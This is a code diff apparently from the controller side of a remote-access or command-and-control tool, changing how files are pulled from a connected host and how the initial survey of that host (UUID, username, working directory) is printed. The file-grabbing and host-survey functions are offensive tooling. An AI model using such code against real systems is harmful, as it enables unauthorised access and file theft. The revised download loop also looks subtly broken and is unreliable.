@@ -137,25 +137,32 @@ def file_transfer_get(conn, command):      #get file from server
     send_data(conn, new_cmd + "[END]")
     file = command.split()
     dest_filename = file[2]
-    f = open(dest_filename,'wb')
+    
     print_info("Grabbing {} --> {}".format(command.split()[1], dest_filename))
     while True: 
         data = base64_decode(conn.recv(1024).decode())
         if DEBUG:
             print(data)
-        if "####FILE_#NOT#_FOUND####" in data:
-            print_fail("File not found")
-            f.close()
-            remove(dest_filename)
+        if "[file-not-found]" in data:
+            print_fail("File not found")          
             break
-        elif data.endswith(b"[END]"):
-            f.write(data.rstrip(b"[END]"))
-            print_good("Transfer completed")
-            f.close()
-            break
-        else:
-            f.write(data)
-    f.close()
+        elif "[file-found]" in data:
+            if VERBOSE:
+                print_good("File Found, Downloading...")
+            with open(dest_filename,'wb') as f:
+                data_b64 = ""
+                data = ""
+                while not data.endswith('[END]'):
+                    recv = conn.recv(128)
+                    recv_decoded = recv.decode('utf-8')
+                    data_b64 = data_b64 + recv_decoded
+
+                    recv_decoded = base64_decode(recv.decode('utf-8'))
+                    data = data + recv_decoded
+
+                if DEBUG:
+                    print(data_b64)
+                f.write(data)
 
 def file_transfer_put(conn, commands):       #push file to server
     send_data(conn, commands + "[END]")
@@ -251,13 +258,13 @@ def run_initial_survey(conn):
     get_working_dir(conn)
     username = get_username(conn)
     print()
-    print(WHITE + "=============================")
+    print(WHITE)
     print("UUID: " + uuid)
     print("Connection From: " + CONNECTED_HOST)
     print("Working Dir: " + CURRENT_WORKING_DIR)
     print("System Time: " + time)
     print("Username: " + username)
-    print("=============================" + RSTCOLORS)
+    print(RSTCOLORS)
     print()
 
 def get_time(conn):
